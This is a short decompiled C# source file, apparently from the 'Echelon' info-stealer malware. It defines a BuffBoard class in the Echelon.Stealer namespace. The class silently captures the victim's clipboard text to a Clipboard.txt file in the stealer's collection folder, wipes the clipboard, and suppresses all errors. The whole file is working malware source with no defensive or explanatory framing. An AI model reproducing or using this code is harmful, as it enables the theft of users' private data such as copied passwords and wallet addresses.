using System;
using System.IO;
using System.Windows;
using Echelon.Global;

namespace Echelon.Stealer.SystemsData
{
	// Token: 0x0200001F RID: 31
	public static class BuffBoard
	{
		// Token: 0x06000057 RID: 87 RVA: 0x000051B0 File Offset: 0x000033B0
		public static void GetClipboard(string Echelon_Dir)
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					File.WriteAllText(Echelon_Dir + "\\Clipboard.txt", string.Concat(new string[]
					{
						"[",
						Help.date,
						"]\r\n\r\n",
						ClipboardNative.GetText(),
						"\r\n\r\n"
					}));
					NativeMethods.EmptyClipboard();
				}
			}
			catch
			{
			}
		}
	}
}
